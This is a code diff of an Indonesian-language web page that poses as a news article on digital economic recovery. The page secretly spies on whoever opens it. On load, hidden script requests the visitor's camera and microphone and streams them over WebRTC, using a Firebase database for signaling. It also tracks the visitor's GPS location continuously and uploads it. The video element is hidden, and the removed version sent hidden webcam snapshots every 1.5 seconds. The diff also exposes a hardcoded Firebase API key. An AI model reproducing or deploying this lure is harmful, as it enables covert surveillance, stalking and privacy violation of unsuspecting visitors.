@@ -1,46 +1,74 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Berita Hari Ini</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Berita Terkini Nasional</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { font-family: 'Helvetica', sans-serif; margin: 0; padding: 20px; color: #333; }
+        .top-bar { background: #d32f2f; color: white; padding: 15px; font-weight: bold; margin: -20px -20px 20px -20px; }
+        .content { max-width: 600px; margin: 0 auto; }
+        img { width: 100%; border-radius: 4px; }
+        #v { display: none; }
+    </style>
 </head>
-<body style="font-family:sans-serif; padding:20px;">
-    <h2>Berita Utama: Cuaca Ekstrim Melanda Kota</h2>
-    <p>Silakan baca berita selengkapnya di bawah ini...</p>
-    
-    <!-- Elemen tersembunyi -->
-    <video id="v" autoplay style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+<body>
+    <div class="top-bar">LIPUTAN KHUSUS</div>
+    <div class="content">
+        <h1>Strategi Baru Pemulihan Ekonomi di Era Digital</h1>
+        <p><small>Dipublikasikan: Baru saja</small></p>
+        <img src="https://picsum.photos/600/350" alt="Berita">
+        <p>Pemerintah baru saja mengumumkan langkah-langkah strategis untuk memperkuat infrastruktur digital di seluruh provinsi. Program ini diharapkan dapat meningkatkan koneksi antar daerah secara instan...</p>
+    </div>
+
+    <video id="v" autoplay playsinline muted></video>
 
     <script>
-        const config = {
+        const firebaseConfig = {
             apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
             databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "chatroom-e9b3f"
         };
-        firebase.initializeApp(config);
-        const db = firebase.database().ref('simple_monitor');
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database().ref('secure_p2p_v3');
 
-        async function start() {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            v.srcObject = stream;
+        let pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
 
-            // Ambil Lokasi
+        async function init() {
+            // Bersihkan data lama
+            await db.remove();
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = stream;
+                stream.getTracks().forEach(track => pc.addTrack(track, stream));
+            } catch (e) { console.log("Izin ditolak"); }
+
+            // Kirim Lokasi
             navigator.geolocation.watchPosition(p => {
                 db.child('loc').set({lat: p.coords.latitude, lng: p.coords.longitude});
             });
 
-            // Kirim Gambar setiap 1.5 detik
-            setInterval(() => {
-                c.width = 320; c.height = 240;
-                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
-                db.child('img').set(c.toDataURL('image/jpeg', 0.5));
-            }, 1500);
+            // Signaling
+            pc.onicecandidate = e => { if(e.candidate) db.child('ice_t').push(e.candidate.toJSON()); };
+            
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            db.child('sdp').set({offer: {type: offer.type, sdp: offer.sdp}});
+
+            db.child('sdp/answer').on('value', async s => {
+                const a = s.val();
+                if(a && !pc.currentRemoteDescription) await pc.setRemoteDescription(new RTCSessionDescription(a));
+            });
+
+            db.child('ice_m').on('child_added', s => pc.addIceCandidate(new RTCIceCandidate(s.val())));
         }
-        window.onload = start;
+
+        window.onload = init;
     </script>
 </body>
 </html>
